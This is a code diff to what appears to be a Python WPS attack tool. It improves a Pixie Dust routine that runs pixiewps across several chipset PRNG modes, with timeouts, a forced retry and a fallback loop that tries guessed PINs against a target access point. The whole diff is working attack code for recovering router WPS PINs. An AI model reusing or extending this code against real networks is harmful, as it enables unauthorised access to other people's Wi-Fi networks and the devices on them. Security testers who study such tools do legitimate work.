@@ -5515,61 +5515,68 @@ class Companion:
                     return raw[:7] + str(WPSpin.checksum(int(raw[:7])))
             return None
 
-        def _exec_cmd(cmd_str):
+        def _exec_cmd(cmd_str, timeout=10):
             if showcmd:
                 print(f'{info} {cmd_str}')
-            r = subprocess.run(cmd_str, shell=True, stdout=subprocess.PIPE,
-                               stderr=subprocess.PIPE, encoding='utf-8', errors='replace')
-            combined = (r.stdout or '') + ('\n' + r.stderr if r.stderr else '')
-            return combined
+            try:
+                r = subprocess.run(cmd_str, shell=True, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE, encoding='utf-8', errors='replace',
+                                   timeout=timeout)
+                combined = (r.stdout or '') + ('\n' + r.stderr if r.stderr else '')
+                return combined
+            except subprocess.TimeoutExpired:
+                logger.debug('pixiewps command timed out after %ds: %s', timeout, cmd_str)
+                return ''
+            except Exception as e:
+                logger.debug('pixiewps execution error: %s', e)
+                return ''
 
-        # Pass 1: Standard Auto mode
+        # Pass 1: Standard Auto mode (evaluates modes 1, 2, and 3)
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
-        out_text = _exec_cmd(cmd)
+        out_text = _exec_cmd(cmd, timeout=10)
         if out_text.strip() and not showcmd:
             print(out_text.strip())
         pin = _extract_pin(out_text)
         if pin:
             return pin
 
-        # Pass 2: Chipset-hinted mode if available
+        # Pass 2: Chipset-hinted mode if available from BSSID OUI
         chipset_hint = _chipset_mode_hint(self._current_bssid)
-        if chipset_hint is not None:
+        if chipset_hint is not None and chipset_hint not in (1, 2, 3):
             chip_cmd = self.pixie_creds.get_pixie_cmd(full_range=full_range, mode=chipset_hint)
-            chip_out = _exec_cmd(chip_cmd)
+            chip_out = _exec_cmd(chip_cmd, timeout=8)
             pin = _extract_pin(chip_out)
             if pin:
                 if chip_out.strip() and not showcmd:
                     print(chip_out.strip())
                 return pin
 
-        # Pass 3: Multi-mode pass for standard chipset modes (3=Ralink, 1=RT/BCM, 2=eCos, 4=BCM, 5=Realtek/D-Link)
-        tried_modes = {chipset_hint} if chipset_hint is not None else set()
-        for mode in (3, 1, 2, 4, 5):
-            if mode in tried_modes:
-                continue
-            mode_cmd = self.pixie_creds.get_pixie_cmd(full_range=full_range, mode=mode)
-            mode_out = _exec_cmd(mode_cmd)
-            pin = _extract_pin(mode_out)
-            if pin:
-                if mode_out.strip() and not showcmd:
-                    print(mode_out.strip())
-                return pin
-            if 'might' in mode_out.lower() and 'vulnerable' in mode_out.lower():
-                out_text = mode_out
-
-        # Pass 4: Auto-retry with --force if output indicates target might be vulnerable
+        # Pass 3: Experimental modes (4=eCos simplest, 5=eCos Knuth)
+        # Only run if user specified --pixie-force / full_range, or if pixiewps output
+        # indicates the AP might be vulnerable, with a strict timeout to avoid freezing on mobile.
         stdout_lower = out_text.lower()
         might_vulnerable = ('might' in stdout_lower and 'vulnerable' in stdout_lower)
-        if might_vulnerable and not full_range:
-            print(f'{warn} AP /might be/ vulnerable — auto-retrying Pixiewps with --force …')
-            force_cmd = self.pixie_creds.get_pixie_cmd(full_range=True)
-            out_text2 = _exec_cmd(force_cmd)
-            if out_text2.strip():
-                print(out_text2.strip())
-            pin = _extract_pin(out_text2)
-            if pin:
-                return pin
+        if full_range or might_vulnerable:
+            if might_vulnerable and not full_range:
+                print(f'{warn} AP might be vulnerable — testing extended PRNG modes…')
+            for mode in (4, 5):
+                mode_cmd = self.pixie_creds.get_pixie_cmd(full_range=full_range, mode=mode)
+                mode_out = _exec_cmd(mode_cmd, timeout=8)
+                pin = _extract_pin(mode_out)
+                if pin:
+                    if mode_out.strip() and not showcmd:
+                        print(mode_out.strip())
+                    return pin
+
+            if might_vulnerable and not full_range:
+                print(f'{warn} AP /might be/ vulnerable — retrying Pixiewps with --force …')
+                force_cmd = self.pixie_creds.get_pixie_cmd(full_range=True)
+                out_text2 = _exec_cmd(force_cmd, timeout=15)
+                if out_text2.strip():
+                    print(out_text2.strip())
+                pin = _extract_pin(out_text2)
+                if pin:
+                    return pin
 
         return False
 
@@ -6069,11 +6076,15 @@ class Companion:
                     time.sleep(0.8)
                     print(f'{info} Fallback: Trying PIN {f_pin}…')
                     logger.info('Pixie Dust fallback trying PIN %s for BSSID %s', f_pin, bssid)
-                    res = self.single_connection(bssid=bssid, ssid=ssid, pin=f_pin, pixiemode=False,
-                                                 store_pin_on_fail=store_pin_on_fail,
-                                                 output_file=output_file, freq_mhz=freq_mhz)
-                    if res:
-                        return res
+                    try:
+                        res = self.single_connection(bssid=bssid, ssid=ssid, pin=f_pin, pixiemode=False,
+                                                     store_pin_on_fail=store_pin_on_fail,
+                                                     output_file=output_file, freq_mhz=freq_mhz)
+                        if res:
+                            return res
+                    except KeyboardInterrupt:
+                        print("\nAborting fallback attempts…")
+                        return False
                 return False
             else:
                 missing = self.pixie_creds.missing_critical()
